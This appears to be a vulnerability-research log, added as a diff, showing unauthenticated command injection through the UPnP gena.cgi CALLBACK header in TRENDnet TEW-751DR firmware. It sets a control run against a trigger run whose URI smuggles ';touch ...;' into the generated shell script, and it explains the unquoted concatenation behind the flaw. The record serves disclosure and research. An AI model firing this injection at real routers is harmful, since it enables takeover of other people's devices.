@@ -1,0 +1,50 @@
+=== gena.cgi CALLBACK -> generated shell script (no authentication) ===
+target : TRENDnet TEW-751DR 1.03B01
+image  : TEW-751DRv1_(FW1.03B01).zip
+sha256 : fe1168fc2b2bf4744df3a7145eeaf11b2c5272ae502c8f2993e5c614499322ec
+gena.php sha256: 2934eb2052ea14a0360efaa76567f966f89ff7c45178743d555b300e7b70a5cb
+host   : lab-host  2026-10-30T23:10:00+08:00
+single variable: the URI part of CALLBACK contains ';cmd;' or not
+script generator: the firmware's own htdocs/upnpinc/gena.php (run under php-cli)
+
+########## CONTROL   CALLBACK: <http://10.0.0.9/aaa> ##########
+      -V HDR_URL=aaa
+  run with the firmware's own busybox sh (chroot):
+      sh: xmldbc: not found
+  injected command executed?
+      /var/tmp/gena/PWNED does not exist (expected: no injection)
+
+########## TRIGGER   CALLBACK: <http://10.0.0.9/aaa;touch /var/tmp/gena/PWNED;bbb> ##########
+      -V HDR_URL=aaa;touch /var/tmp/gena/PWNED;bbb
+  same busybox sh, same chroot, only the URI changed:
+      sh: xmldbc: not found
+      sh: bbb: not found
+      sh: httpc: not found
+  injected command executed?
+      /var/tmp/gena/PWNED exists: -rw-r--r-- root:root 0 bytes
+
+[replay done] control and trigger differ only in ';touch ...;' inside the URI
+
+--------------------------------------------------------------------------------
+Generated script (trigger run) -- produced by the firmware's own gena.php, verbatim:
+
+#!/bin/sh
+echo "[$0] ..." > /dev/null
+xmldbc -P /htdocs/upnp/NOTIFY.WANIPConnection.1.php -V INF_UID=InternetGatewayDevice -V HDR_URL=aaa;touch /var/tmp/gena/PWNED;bbb -V HDR_HOST=10.0.0.9 -V HDR_SID=uuid:11111111-2222-3333-4444-555555555555 -V HDR_SEQ=0 | httpc -i br0 -d "10.0.0.9" -p TCP > /dev/null
+rm -f /var/tmp/gena/WANIPConn1_1.sh
+--------------------------------------------------------------------------------
+
+Why the injected command runs: $uri is concatenated after " -V HDR_URL=" with no
+quoting, so the ';' terminates the xmldbc command. The "xmldbc: not found" /
+"bbb: not found" / "httpc: not found" lines are expected in the emulation (those
+binaries are absent there); they do not affect the injected segment, which is the
+second ';'-separated word. On the device both binaries exist and the line is sent
+to the event subscriber as intended.
+
+Limits of this evidence:
+  * phpserver and xmldbc_timer were NOT executed. The device-side hop from the CGI
+    to gena.php and from the script file to the timer is established by decompilation
+    (genacgi_main @ 0x40ec78 -> FUN_0040e740 -> xmldbc_ephp / xmldbc_timer).
+  * The script was generated with the vendor's own PHP source and executed with the
+    vendor's own shell; no hand-written reproduction of the script was used.
+  * Not tested on hardware; WAN-side exposure not tested.
